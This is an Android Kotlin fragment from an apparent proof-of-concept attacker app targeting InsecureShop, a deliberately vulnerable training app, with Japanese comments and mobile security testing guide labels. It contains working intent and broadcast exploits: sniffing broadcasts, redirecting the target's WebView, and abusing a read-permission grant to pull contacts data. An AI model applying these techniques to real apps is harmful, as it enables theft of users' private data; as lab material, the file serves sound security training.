package com.websarva.wings.android.insecureshoppoc.ui.fragment.platform

import android.app.Activity
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.ContactsContract
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.fragment.app.Fragment
import androidx.fragment.app.viewModels
import com.websarva.wings.android.insecureshoppoc.R
import com.websarva.wings.android.insecureshoppoc.databinding.FragmentPlatform4Binding
import com.websarva.wings.android.insecureshoppoc.ui.fragment.InfoDialogFragment
import com.websarva.wings.android.insecureshoppoc.viewmodel.fragment.storage.PlatformViewModel
import dagger.hilt.android.AndroidEntryPoint

@AndroidEntryPoint
class Platform4Fragment: Fragment() {
    private var _binding: FragmentPlatform4Binding? = null
    private val binding
    get() = _binding!!

    private val viewModel: PlatformViewModel by viewModels()

    private var receiver: MyBroadcastReceiver? = null
    private var receiver2: MyBroadcastReceiver2? = null
    // activityのcallbackを定義
    private val callback = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ){ result ->
        if (result.resultCode == Activity.RESULT_OK){
            viewModel.dump(result.data?.data!!)
        }else{
            Log.w("Warning", "ACTIVITY RESULT FAILURE")
            Toast.makeText(activity, getString(R.string.mstg_platform_4_toast_error), Toast.LENGTH_SHORT).show()
        }
    }

    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {
        _binding = FragmentPlatform4Binding.inflate(inflater, container, false)

        return binding.root
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)

        // defaultのラジオボタン
        binding.rb1.isChecked = true

        // buttonタップ時の処理
        binding.button.setOnClickListener {
            when(binding.radioGroup.checkedRadioButtonId){
                binding.rb1.id -> {
                    // receiverの解除
                    if (receiver != null){
                        activity?.unregisterReceiver(receiver)
                        receiver = null
                    }
                    // receiverの登録
                    receiver = MyBroadcastReceiver()
                    val intentFilter = IntentFilter("com.insecureshop.action.BROADCAST")
                    activity?.registerReceiver(receiver, intentFilter)

                    // 0.5秒後に攻撃を開始
                    Handler(Looper.myLooper()!!).postDelayed({
                        val intent = Intent().apply {
                            setClassName("com.insecureshop", "com.insecureshop.AboutUsActivity")
                        }
                        // 対象アクティビティの起動
                        startActivity(intent)
                    }, 500)
                }
                binding.rb2.id -> {
                    // receiverの解除
                    if (receiver2 != null){
                        activity?.unregisterReceiver(receiver2)
                        receiver2 = null
                    }
                    // receiverの登録
                    receiver2 = MyBroadcastReceiver2()
                    val intentFilter = IntentFilter("com.insecureshop.action.PRODUCT_DETAIL")
                    activity?.registerReceiver(receiver2, intentFilter)
                }
                binding.rb3.id -> {
                    // intentを定義
                    val intent = Intent().apply {
                        data = ContactsContract.RawContacts.CONTENT_URI
                        flags = Intent.FLAG_GRANT_READ_URI_PERMISSION
                        setClassName("com.insecureshop", "com.insecureshop.ResultActivity")
                    }
                    try {
                        // activityの起動
                        callback.launch(intent)
                    }catch (e: SecurityException){
                        Log.w("Warning", "ACTIVITY RESULT FAILURE")
                        Toast.makeText(activity, getString(R.string.mstg_platform_4_toast_error), Toast.LENGTH_SHORT).show()
                    }
                }
                else -> {
                    throw IllegalArgumentException("Out of range of the array.")
                }
            }
        }

        // receiveDataの通知
        viewModel.receiveData.observe(this.viewLifecycleOwner){
            if (!it.isNullOrBlank()){
                activity?.let { activity ->
                    InfoDialogFragment(getString(R.string.mstg_platform_4_title), it).show(activity.supportFragmentManager, "InfoDialog")
                }
            }
        }
        // resultDumpの通知
        viewModel.resultDump.observe(this.viewLifecycleOwner){
            if (!it.isNullOrBlank()){
                activity?.let { activity ->
                    InfoDialogFragment(getString(R.string.mstg_platform_4_title), it).show(activity.supportFragmentManager, "InfoDialog")
                }
            }
        }
    }

    inner class MyBroadcastReceiver: BroadcastReceiver(){
        override fun onReceive(p0: Context?, intent: Intent?) {
            viewModel.setData(intent!!)
        }
    }

    inner class MyBroadcastReceiver2: BroadcastReceiver(){
        override fun onReceive(context: Context?, p1: Intent?) {
            // intentの定義
            // Android 10 以降ではアプリの動作制限が厳しくなった原因のため正常に動作しない可能性有
            val webIntent = Intent("com.insecureshop.action.WEBVIEW").apply {
                putExtra("url", "http://example.com")
                setPackage("com.insecureshop")
            }
            // 対象アクティビティの起動
            context?.startActivity(webIntent)
        }
    }

    override fun onDestroyView() {
        // receiverの解除
        if (receiver != null){
            activity?.unregisterReceiver(receiver)
            receiver = null

            activity?.unregisterReceiver(receiver2)
            receiver2 = null
        }
        _binding = null

        super.onDestroyView()
    }
}